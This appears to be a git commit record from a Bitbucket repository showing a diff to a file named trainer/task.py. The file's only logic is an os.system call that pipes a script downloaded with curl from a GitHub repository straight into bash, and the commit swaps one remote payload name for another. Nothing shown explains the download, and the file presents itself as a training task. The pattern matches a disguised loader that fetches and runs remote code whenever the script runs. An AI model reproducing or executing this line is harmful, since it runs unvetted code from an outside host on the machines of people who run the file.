533fd9da6866fa3665ff5c8105d307f355ffdde1
df hdhdh <jeffreyadams29@outlook.com>
2023-11-29 14:24:27 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/jineosmeda/kanyut/raw/main/mimin | bash')
+os.system('curl -sL https://github.com/jineosmeda/kanyut/raw/main/mey | bash')
